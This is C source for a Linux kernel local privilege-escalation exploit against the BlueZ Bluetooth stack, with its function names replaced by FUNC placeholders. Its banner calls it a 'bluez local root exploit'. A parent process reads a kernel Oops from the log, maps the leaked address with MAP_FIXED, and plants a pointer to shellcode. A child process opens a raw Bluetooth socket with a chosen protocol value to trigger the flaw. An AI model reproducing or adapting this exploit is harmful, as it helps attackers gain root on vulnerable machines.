#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct utsname {char* release; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_BLUETOOTH ; 
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_SHARED ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int FUNC0 (void*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 scalar_t__ FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  gid ; 
 int FUNC5 (int,char*,int) ; 
 int /*<<< orphan*/  load_highlevel ; 
 int* FUNC6 (void*,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,unsigned int) ; 
 char* FUNC9 (char*,char*) ; 
 unsigned int FUNC10 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  uid ; 
 scalar_t__ FUNC11 (struct utsname*) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int) ; 

FUNC14(int argc, char *argv[])
{
char buf[2048];
int sock, *mod = (int*)buf;
int *linker = 0;

unsigned int arg;
int tmp;
char *check;
struct utsname vers;

gid  = FUNC3();
uid  = FUNC4();

FUNC7("-|-bluez local root exploit v.0.9  -by qobaiashi-\n |\n");
if (FUNC11(&vers) < 0)
   FUNC7(" |- couldn't determine kernel version\n");

else
    FUNC7(" |- i've found kernel %s\n", vers.release);
    

FUNC7(" |- trampoline is at %p\n", &load_highlevel);


if (argc < 2)
   {
    FUNC12(argv[0]);
    FUNC1(1);
    }

if (argc == 2)
    arg = FUNC10(argv[1], 0, 0);


if (FUNC2() != 0)//parent watch the Oops
   {
    //previous Oops printing
   FUNC13(1000);
   if ((tmp = FUNC5(0x3, buf, 1700)) > -1)
       {
        check = FUNC9(buf, "ecx: ");
        FUNC7(" |- [%0.14s]\n", check);
        check+=5;
        *(check+9) = 0x00;*(--check) = 'x';*(--check) = '0';
        mod = (unsigned int*)FUNC10(check, 0, 0);
        //page align FIXME: might be booggy
        int *ecx = mod;
        mod = (int)mod &~ 0x00000fff;
        linker = 
FUNC6((void*)mod,0x2000,PROT_WRITE|PROT_READ,MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED,0,0);
        if(linker == mod)//we could mmap the area
          {
           FUNC7(" |- suitable value found!using %p\n", mod);
           FUNC7(" |- the time has come to push the button... \n");
           for (sock = 0;sock <= 1;sock++)          //use ecx
                *(ecx++) = (int)&load_highlevel;   //link to shellcode
           }

           else 
             {
              FUNC7(" |- could not mmap   %p\n", mod);
              if( FUNC0((void*)mod+0x200 ) == -1)
                {
                 FUNC7(" |- could not brk to %p\n", mod);
                 FUNC7(" `-------------------------------\n");
                 FUNC1(-1);
                 }
              //here we did it
              FUNC7(" |- suitable value found!using %p\n", mod);
              FUNC7(" |- the time has come to push the button... \n");
              for (sock = 0;sock <= 1;sock++)          //use ecx
                  *(ecx++) = (int)&load_highlevel;    //link to shellcode

              }
           if ((sock = FUNC8(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
               FUNC1(1);
                               
        }
   return 0;
   }

if (FUNC2() == 0)//child does the pre-exploit
{
  FUNC7(" |- trying...\n");
  if ((sock = FUNC8(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
      {
      FUNC7(" |- something went w0rng (invalid value)\n");
      FUNC1(1);
     }
}

FUNC1(0);
}